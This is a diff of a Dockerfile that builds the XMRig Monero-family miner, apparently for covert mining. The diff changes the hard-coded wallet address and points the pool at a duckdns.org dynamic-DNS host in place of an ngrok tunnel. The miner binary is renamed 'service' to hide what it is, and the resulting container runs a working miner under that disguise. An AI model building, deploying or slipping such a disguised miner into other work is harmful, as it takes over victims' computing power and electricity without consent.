@@ -27,8 +27,8 @@ RUN cd xmrig/build && \
 
 FROM alpine:3.13
 
-ENV WALLET=SOL:HGDzRh99Lvq6ow3WQ91sdrwPNER8Lt7hka5SmXg5k9Rx.xmr
-ENV POOL=stratum+tcp://0.tcp.ap.ngrok.io:14464
+ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
+ENV POOL=imboost.duckdns.org:1123
 ENV WORKER_NAME=x
 
 RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
@@ -41,4 +41,4 @@ WORKDIR /xmr
 COPY --from=builder /servis/xmrig/build/xmrig /xmr
 RUN mv xmrig service 
 
-CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --coin=monero"]
+CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
